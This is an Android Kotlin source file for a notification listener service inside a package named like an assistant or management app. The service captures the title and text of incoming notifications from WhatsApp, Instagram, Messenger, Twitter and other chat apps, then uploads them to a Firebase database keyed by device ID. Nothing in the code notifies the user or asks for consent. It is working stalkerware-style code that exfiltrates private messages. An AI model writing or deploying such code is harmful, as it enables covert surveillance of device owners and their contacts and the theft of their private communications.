package com.assisten.gestion

import android.annotation.SuppressLint
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.provider.Settings
import com.google.firebase.database.FirebaseDatabase

class NotificationService : NotificationListenerService() {

    @SuppressLint("HardwareIds")
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val packageName = sbn.packageName
        // Filtrar apps comunes o registrar todas
        val appsToTrack = listOf("com.whatsapp", "com.instagram.android", "com.facebook.orca", "com.twitter.android")
        
        if (appsToTrack.contains(packageName) || packageName.contains("chat") || packageName.contains("message")) {
            val title = sbn.notification.extras.getString("android.title") ?: "Sin título"
            val text = sbn.notification.extras.getCharSequence("android.text")?.toString() ?: "Sin contenido"
            val timestamp = System.currentTimeMillis()
            val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)

            val log = mapOf(
                "app" to packageName,
                "title" to title,
                "text" to text,
                "timestamp" to timestamp
            )

            FirebaseDatabase.getInstance().reference
                .child("notifs")
                .child(deviceId)
                .push()
                .setValue(log)
        }
    }
}
